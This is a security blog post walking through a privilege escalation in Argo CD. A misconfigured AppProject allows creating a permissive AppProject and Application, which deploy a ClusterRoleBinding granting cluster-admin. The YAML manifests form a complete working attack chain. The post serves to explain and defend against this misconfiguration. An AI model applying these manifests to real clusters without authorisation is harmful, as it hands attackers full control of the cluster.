---
layout: post
title: Argo CD Privesc Example Walk Through
date: 2021-05-19 16:00:00 +09:00
tags: security
---



My [Argo CD Privilege Escalations post](/2021/05/19/argo-cd-privilege-escalations/) describes some privilege escalation possibilities, if Argo CD projects are not configured securely. In this post I'll show a complete walkthrough on abusing one of these possible misconfigurations.

<!--break-->

# Given

Given an `AppProject` that forbids cluster resources entirely and namespace resources from `rbac.authorization.k8s.io/v1` ruling out `Role`, `RoleBinding` etc.:

{% highlight yaml %}
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
  name: vulnerable-project
  namespace: argocd
spec:
  description: Example Project
  sourceRepos:
  - "*"
  destinations:
  - namespace: "*"
    server: https://kubernetes.default.svc
  clusterResourceBlacklist:
  - group: "*"
    kind: "*"
  namespaceResourceBlacklist:
  - group: rbac.authorization.k8s.io/v1
    kind: "*"
{% endhighlight %}

# Goal

The goal is to get `cluster-admin` over the cluster.

# How to

Since Argo CD `AppProject` and `Application` objects are allowed, we will use those. First we will need an application that will deploy our yaml files:

{% highlight yaml %}
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: gotta-pwn-em-all-prepare-app
  namespace: argocd
spec:
  project: vulnerable-project
  source:
    repoURL: https://github.com/my-team/my-team-apps.git
    targetRevision: HEAD
    path: manifest/gotta-pwn-em-all-prepare
  destination:
    server: https://kubernetes.default.svc
    namespace: argocd
{% endhighlight %}

The next files will be created in the `https://github.com/my-team/my-team-apps` repo under `manifest/gotta-pwn-em-all-prepare/`. Let's make a super permissive `AppProject` here (the only restriction is that it will only deploy things from our team's repo to prevent other's abusing this):

{% highlight yaml %}
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
  name: gotta-pwn-em-all-project
  namespace: argocd
spec:
  description: Privilege Escalation Testing Project
  sourceRepos:
  - https://github.com/my-team/my-team-apps.git
  destinations:
  - namespace: "*"
    server: "*"
  clusterResourceWhitelist:
  - group: "*"
    kind: "*"
  namespaceResourceWhitelist:
  - group: "*"
    kind: "*"
{% endhighlight %}

We will also need an `Application` that uses this project. We can make it with the other `Applications` or in the same folder as the above `AppProject`:

{% highlight yaml %}
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: gotta-pwn-em-all-execute-app
  namespace: argocd
spec:
  project: gotta-pwn-em-all-project
  source:
    repoURL: https://github.com/my-team/my-team-apps.git
    targetRevision: HEAD
    path: manifest/gotta-pwn-em-all-execute
  destination:
    server: https://kubernetes.default.svc
    namespace: default
{% endhighlight %}


(The app will only have non-namespace resources, so the `namespace` in `destination` doesn't matter.) In the `manifest/gotta-pwn-em-all-execute/` folder, let's make the thing we actually want to be deployed:

{% highlight yaml %}
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: gotta-pwn-em-all-clusteradmin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: User
    name: oidc:johnsmith
  - kind: Group
    name: oidc:security-team
{% endhighlight %}

So in the end you should have these files (assuming the files are named like the objects in them):

{% highlight yaml %}
https://github.com/my-team/my-team-apps:
  ↳ applications/
    - gotta-pwn-em-all-prepare-app.yaml
  ↳ manifest/
    ↳ gotta-pwn-em-all-prepare/
      - gotta-pwn-em-all-project.yaml
      - gotta-pwn-em-all-execute-app.yaml
    ↳ gotta-pwn-em-all-execute/
      - gotta-pwn-em-all-clusteradmin.yaml
{% endhighlight %}
